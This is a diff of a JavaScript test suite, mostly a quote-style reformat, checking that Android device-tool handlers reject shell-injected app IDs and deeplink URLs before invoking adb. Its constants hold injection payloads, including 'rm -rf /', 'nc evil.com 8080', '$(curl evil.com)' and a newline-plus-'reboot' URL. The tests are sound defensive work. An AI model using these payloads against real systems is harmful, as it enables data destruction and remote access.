@@ -15,8 +15,8 @@
 //
 // In each case: the validation MUST fire before any adb invocation, so
 // we don't need an emulator running — the handler must short-circuit.
-import { test } from 'node:test';
-import assert from 'node:assert/strict';
+import { test } from "node:test";
+import assert from "node:assert/strict";
 
 function parseEnvelope(result) {
   return JSON.parse(result.content[0].text);
@@ -24,39 +24,44 @@ function parseEnvelope(result) {
 
 // ── Attack payloads ────────────────────────────────────────────────
 
-const VALID_APPID = 'com.rndevagent.testapp';
-const VALID_HYPHENATED = 'com.rn-dev-agent.testapp';
-const ATTACK_NEWLINE = 'com.example.app\nrm -rf /';
-const ATTACK_SHELL_METACHARS = 'com.example;rm -rf /';
-const ATTACK_BACKTICK = 'com.example.app`whoami`';
-const ATTACK_PIPE = 'com.example|nc evil.com 8080';
-const ATTACK_SUBSTITUTION = 'com.example$(curl evil.com)';
+const VALID_APPID = "com.rndevagent.testapp";
+const VALID_HYPHENATED = "com.rn-dev-agent.testapp";
+const ATTACK_NEWLINE = "com.example.app\nrm -rf /";
+const ATTACK_SHELL_METACHARS = "com.example;rm -rf /";
+const ATTACK_BACKTICK = "com.example.app`whoami`";
+const ATTACK_PIPE = "com.example|nc evil.com 8080";
+const ATTACK_SUBSTITUTION = "com.example$(curl evil.com)";
 
 // ── device_permission ───────────────────────────────────────────────
 
-test('Phase 134.2: device_permission rejects newline-injected appId before adb', async () => {
-  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
+test("Phase 134.2: device_permission rejects newline-injected appId before adb", async () => {
+  const { createDevicePermissionHandler } = await import("../../dist/tools/device-permission.js");
   const handler = createDevicePermissionHandler();
   const r = await handler({
-    action: 'revoke',
-    permission: 'notifications',
+    action: "revoke",
+    permission: "notifications",
     appId: ATTACK_NEWLINE,
-    platform: 'android',
+    platform: "android",
   });
   assert.equal(r.isError, true);
   const env = parseEnvelope(r);
   assert.match(env.error, /invalid|appId|bundle/i);
 });
 
-test('Phase 134.2: device_permission rejects shell-metachar appId before adb', async () => {
-  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
+test("Phase 134.2: device_permission rejects shell-metachar appId before adb", async () => {
+  const { createDevicePermissionHandler } = await import("../../dist/tools/device-permission.js");
   const handler = createDevicePermissionHandler();
-  for (const malicious of [ATTACK_SHELL_METACHARS, ATTACK_BACKTICK, ATTACK_PIPE, ATTACK_SUBSTITUTION]) {
+  for (const malicious of [
+    ATTACK_SHELL_METACHARS,
+    ATTACK_BACKTICK,
+    ATTACK_PIPE,
+    ATTACK_SUBSTITUTION,
+  ]) {
     const r = await handler({
-      action: 'grant',
-      permission: 'camera',
+      action: "grant",
+      permission: "camera",
       appId: malicious,
-      platform: 'android',
+      platform: "android",
     });
     assert.equal(r.isError, true, `Expected error for appId ${JSON.stringify(malicious)}`);
     const env = parseEnvelope(r);
@@ -64,82 +69,88 @@ test('Phase 134.2: device_permission rejects shell-metachar appId before adb', a
   }
 });
 
-test('Phase 134.2: device_permission rejects malicious appId on QUERY action too (no exception)', async () => {
-  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
+test("Phase 134.2: device_permission rejects malicious appId on QUERY action too (no exception)", async () => {
+  const { createDevicePermissionHandler } = await import("../../dist/tools/device-permission.js");
   const handler = createDevicePermissionHandler();
   const r = await handler({
-    action: 'query',
-    permission: 'all',
+    action: "query",
+    permission: "all",
     appId: ATTACK_NEWLINE,
-    platform: 'android',
+    platform: "android",
   });
   assert.equal(r.isError, true);
 });
 
-test('Phase 134.2: device_permission preserves iOS-only rejection (CDP-014 regression preserved)', async () => {
+test("Phase 134.2: device_permission preserves iOS-only rejection (CDP-014 regression preserved)", async () => {
   // The earlier validation for unknown platforms still fires. Our new
   // bundle-ID check should not regress that path.
-  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
+  const { createDevicePermissionHandler } = await import("../../dist/tools/device-permission.js");
   const handler = createDevicePermissionHandler();
   const r = await handler({
-    action: 'revoke',
-    permission: 'notifications',
+    action: "revoke",
+    permission: "notifications",
     appId: VALID_APPID,
-    platform: 'andriod',
+    platform: "andriod",
   });
   assert.equal(r.isError, true);
   const env = parseEnvelope(r);
-  assert.equal(env.code, 'INVALID_PLATFORM');
+  assert.equal(env.code, "INVALID_PLATFORM");
 });
 
 // ── device_reset_state ──────────────────────────────────────────────
 
-test('Phase 134.2: device_reset_state rejects newline-injected appId before any step', async () => {
-  const { createDeviceResetStateHandler } = await import('../../dist/tools/device-reset-state.js');
+test("Phase 134.2: device_reset_state rejects newline-injected appId before any step", async () => {
+  const { createDeviceResetStateHandler } = await import("../../dist/tools/device-reset-state.js");
   // Pass a fake getClient — the validator should short-circuit before
   // any CDP work.
-  const handler = createDeviceResetStateHandler(() => ({ connectedTarget: null, isConnected: false }));
+  const handler = createDeviceResetStateHandler(() => ({
+    connectedTarget: null,
+    isConnected: false,
+  }));
   const r = await handler({
     appId: ATTACK_NEWLINE,
-    platform: 'android',
+    platform: "android",
   });
   assert.equal(r.isError, true);
   const env = parseEnvelope(r);
   assert.match(env.error, /invalid|appId|bundle/i);
 });
 
-test('Phase 134.2: device_reset_state rejects shell-metachar appId', async () => {
-  const { createDeviceResetStateHandler } = await import('../../dist/tools/device-reset-state.js');
-  const handler = createDeviceResetStateHandler(() => ({ connectedTarget: null, isConnected: false }));
+test("Phase 134.2: device_reset_state rejects shell-metachar appId", async () => {
+  const { createDeviceResetStateHandler } = await import("../../dist/tools/device-reset-state.js");
+  const handler = createDeviceResetStateHandler(() => ({
+    connectedTarget: null,
+    isConnected: false,
+  }));
   const r = await handler({
     appId: ATTACK_SHELL_METACHARS,
-    platform: 'android',
+    platform: "android",
   });
   assert.equal(r.isError, true);
 });
 
 // ── device_deeplink ────────────────────────────────────────────────
 
-test('Phase 134.2: device_deeplink rejects newline-injected packageName before adb', async () => {
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+test("Phase 134.2: device_deeplink rejects newline-injected packageName before adb", async () => {
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'rndatest://foo',
+    url: "rndatest://foo",
     packageName: ATTACK_NEWLINE,
-    platform: 'android',
+    platform: "android",
   });
   assert.equal(r.isError, true);
   const env = parseEnvelope(r);
   assert.match(env.error, /invalid|packageName|package/i);
 });
 
-test('Phase 134.2: device_deeplink rejects shell-metachar packageName', async () => {
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+test("Phase 134.2: device_deeplink rejects shell-metachar packageName", async () => {
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'rndatest://foo',
+    url: "rndatest://foo",
     packageName: ATTACK_BACKTICK,
-    platform: 'android',
+    platform: "android",
   });
   assert.equal(r.isError, true);
 });
@@ -151,51 +162,54 @@ test('Phase 134.2: device_deeplink rejects shell-metachar packageName', async ()
 // "post-validation" by the absence of an "invalid bundle" error, even
 // if the actual adb call fails with a non-validation error.
 
-test('Phase 134.2: device_permission accepts a standard reverse-DNS appId past validation', async () => {
-  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
+test("Phase 134.2: device_permission accepts a standard reverse-DNS appId past validation", async () => {
+  const { createDevicePermissionHandler } = await import("../../dist/tools/device-permission.js");
   const handler = createDevicePermissionHandler();
   const r = await handler({
-    action: 'query',
-    permission: 'all',
+    action: "query",
+    permission: "all",
     appId: VALID_APPID,
-    platform: 'android',
+    platform: "android",
   });
   // May error from adb-not-installed or similar, but NOT with our
   // bundle-validation error. If the error message mentions "invalid"
   // or "bundle", we have a regression on the valid-input path.
   if (r.isError) {
     const env = parseEnvelope(r);
-    assert.doesNotMatch(env.error ?? '', /invalid bundle/i,
-      'Valid bundle ID was incorrectly rejected as invalid');
+    assert.doesNotMatch(
+      env.error ?? "",
+      /invalid bundle/i,
+      "Valid bundle ID was incorrectly rejected as invalid",
+    );
   }
 });
 
-test('Phase 134.2: device_permission accepts hyphenated bundle ID (Expo apps)', async () => {
+test("Phase 134.2: device_permission accepts hyphenated bundle ID (Expo apps)", async () => {
   // Multi-LLM review of 134.1 caught the hyphen-less regex; the validator
   // module now accepts hyphens. Confirm device_permission inherits.
-  const { createDevicePermissionHandler } = await import('../../dist/tools/device-permission.js');
+  const { createDevicePermissionHandler } = await import("../../dist/tools/device-permission.js");
   const handler = createDevicePermissionHandler();
   const r = await handler({
-    action: 'query',
-    permission: 'all',
+    action: "query",
+    permission: "all",
     appId: VALID_HYPHENATED,
-    platform: 'android',
+    platform: "android",
   });
   if (r.isError) {
     const env = parseEnvelope(r);
-    assert.doesNotMatch(env.error ?? '', /invalid bundle/i);
+    assert.doesNotMatch(env.error ?? "", /invalid bundle/i);
   }
 });
 
 // ── device_snapshot (action=open, attachOnly=true) ─────────────────
 
-test('Phase 134.2: device_snapshot action=open rejects newline-injected appId before adb pidof', async () => {
-  const { createDeviceSnapshotHandler } = await import('../../dist/tools/device-session.js');
+test("Phase 134.2: device_snapshot action=open rejects newline-injected appId before adb pidof", async () => {
+  const { createDeviceSnapshotHandler } = await import("../../dist/tools/device-session.js");
   const handler = createDeviceSnapshotHandler();
   const r = await handler({
-    action: 'open',
+    action: "open",
     appId: ATTACK_NEWLINE,
-    platform: 'android',
+    platform: "android",
     attachOnly: true,
   });
   assert.equal(r.isError, true);
@@ -203,13 +217,13 @@ test('Phase 134.2: device_snapshot action=open rejects newline-injected appId be
   assert.match(env.error, /invalid|appId|bundle/i);
 });
 
-test('Phase 134.2: device_snapshot action=open rejects shell-metachar appId', async () => {
-  const { createDeviceSnapshotHandler } = await import('../../dist/tools/device-session.js');
+test("Phase 134.2: device_snapshot action=open rejects shell-metachar appId", async () => {
+  const { createDeviceSnapshotHandler } = await import("../../dist/tools/device-session.js");
   const handler = createDeviceSnapshotHandler();
   const r = await handler({
-    action: 'open',
+    action: "open",
     appId: ATTACK_BACKTICK,
-    platform: 'android',
+    platform: "android",
     attachOnly: true,
   });
   assert.equal(r.isError, true);
@@ -222,68 +236,74 @@ test('Phase 134.2: device_snapshot action=open rejects shell-metachar appId', as
 // of the adb shell command after `am start` completes. Fix: validate
 // + POSIX single-quote the url.
 
-test('Phase 134.2-followup: device_deeplink rejects url with newline-injection', async () => {
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+test("Phase 134.2-followup: device_deeplink rejects url with newline-injection", async () => {
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'myapp://path\nreboot',
-    platform: 'android',
+    url: "myapp://path\nreboot",
+    platform: "android",
   });
   assert.equal(r.isError, true);
   const env = parseEnvelope(r);
   assert.match(env.error, /control characters|newlines/i);
 });
 
-test('Phase 134.2-followup: device_deeplink rejects url with control characters', async () => {
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+test("Phase 134.2-followup: device_deeplink rejects url with control characters", async () => {
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'myapp://pathevil',
-    platform: 'android',
+    url: "myapp://pathevil",
+    platform: "android",
   });
   assert.equal(r.isError, true);
 });
 
-test('Phase 134.2-followup: device_deeplink rejects oversized url', async () => {
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+test("Phase 134.2-followup: device_deeplink rejects oversized url", async () => {
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'myapp://' + 'a'.repeat(5000),
-    platform: 'android',
+    url: "myapp://" + "a".repeat(5000),
+    platform: "android",
   });
   assert.equal(r.isError, true);
   const env = parseEnvelope(r);
   assert.match(env.error, /too long/i);
 });
 
-test('Phase 134.2-followup: device_deeplink accepts urls with legitimate special chars (& ? = #)', async () => {
+test("Phase 134.2-followup: device_deeplink accepts urls with legitimate special chars (& ? = #)", async () => {
   // URL query params with & and = are legitimate; POSIX-quoting keeps them inert.
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'myapp://path?key=value&other=thing#fragment',
-    platform: 'android',
+    url: "myapp://path?key=value&other=thing#fragment",
+    platform: "android",
   });
   // May error from adb-not-installed but NOT from input validation.
   if (r.isError) {
     const env = parseEnvelope(r);
-    assert.doesNotMatch(env.error ?? '', /control characters|newlines|too long/i,
-      'Legitimate URL with query/fragment must pass input validation');
+    assert.doesNotMatch(
+      env.error ?? "",
+      /control characters|newlines|too long/i,
+      "Legitimate URL with query/fragment must pass input validation",
+    );
   }
 });
 
-test('Phase 134.2-followup: device_deeplink without packageName works (optional arg unchanged)', async () => {
+test("Phase 134.2-followup: device_deeplink without packageName works (optional arg unchanged)", async () => {
   // packageName is optional — when omitted, no validation is needed.
-  const { createDeviceDeeplinkHandler } = await import('../../dist/tools/device-deeplink.js');
+  const { createDeviceDeeplinkHandler } = await import("../../dist/tools/device-deeplink.js");
   const handler = createDeviceDeeplinkHandler();
   const r = await handler({
-    url: 'rndatest://foo',
-    platform: 'android',
+    url: "rndatest://foo",
+    platform: "android",
     // packageName intentionally omitted
   });
   if (r.isError) {
     const env = parseEnvelope(r);
-    assert.doesNotMatch(env.error ?? '', /invalid (bundle|packageName)/i,
-      'Omitting packageName should not trigger validation');
+    assert.doesNotMatch(
+      env.error ?? "",
+      /invalid (bundle|packageName)/i,
+      "Omitting packageName should not trigger validation",
+    );
   }
 });
